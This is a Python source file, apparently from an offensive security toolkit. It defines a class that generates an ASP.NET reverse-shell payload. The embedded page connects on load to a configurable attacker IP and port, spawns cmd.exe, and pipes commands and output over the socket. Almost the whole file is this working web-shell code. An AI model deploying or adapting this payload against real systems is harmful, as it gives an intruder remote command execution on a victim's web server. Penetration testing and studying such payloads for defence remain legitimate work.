from .base import ShellCode


class AspxShellCode(ShellCode):
    """
        Class with shellcode for .NET language
    """
    def __init__(self, connect_back_ip='localhost', connect_back_port=5555,
                 bad_chars=['\x00']):
        ShellCode.__init__(self,
                           connect_back_ip=connect_back_ip,
                           connect_back_port=connect_back_port,
                           bad_chars=bad_chars)

    def get_aspx_code(self):
        """ Function to get aspx reverse shellcode """
        if not self.connect_back_ip or not self.connect_back_port:
            print("Settings for connect back listener must be defined")
            return False

        aspx_code = """
        <%@ Page Language="C#" %>
        <%@ Import Namespace="System.Runtime.InteropServices" %>
        <%@ Import Namespace="System.Net" %>
        <%@ Import Namespace="System.Net.Sockets" %>
        <%@ Import Namespace="System.Diagnostics" %>
        <%@ Import Namespace="System.IO" %>
        <%@ Import Namespace="System.Security.Principal" %>
        <script runat="server">
            static NetworkStream socketStream;
            protected void CallbackShell(string server, int port)
            {
                System.Net.Sockets.TcpClient clientSocket = new System.Net.Sockets.TcpClient();
                clientSocket.Connect(server, port);
                socketStream = clientSocket.GetStream();
                Byte[] bytes = new Byte[8192];
                String data = null;
                Process CmdProc;
                CmdProc = new Process();
                CmdProc.StartInfo.FileName = "cmd";
                CmdProc.StartInfo.UseShellExecute = false;
                CmdProc.StartInfo.RedirectStandardInput = true;
                CmdProc.StartInfo.RedirectStandardOutput = true;
                CmdProc.StartInfo.RedirectStandardError = true;
                CmdProc.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
                CmdProc.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);
                CmdProc.Start();
                CmdProc.BeginOutputReadLine();
                CmdProc.BeginErrorReadLine();
                StreamWriter sortStreamWriter = CmdProc.StandardInput;
                int i;
                while ((i = socketStream.Read(bytes, 0, bytes.Length)) != 0)
                {
                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                    if (data == "exit")
                        break;
                    sortStreamWriter.WriteLine(data.Trim());
                }
                clientSocket.Close();
                CmdProc.Close();
            }
            public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
            {
                string[] SplitData = outLine.Data.Split('\\n');
                foreach (string s in SplitData)
                {
                     byte[] msg = System.Text.Encoding.ASCII.GetBytes(s + "\\r\\n");
                     socketStream.Write(msg, 0, msg.Length);
                }
            }
            protected void Page_Load(object sender, EventArgs e)
            {
                CallbackShell("{{LOCALHOST}}", {{LOCALPORT}});
            }
        </script>
        """
        aspx_code = self.format_shellcode(aspx_code)
        return aspx_code

    def get_shellcode(self, inline=False):
        shell = self.get_aspx_code()
        if inline:
            shell = self.make_inline(shell)
        return shell
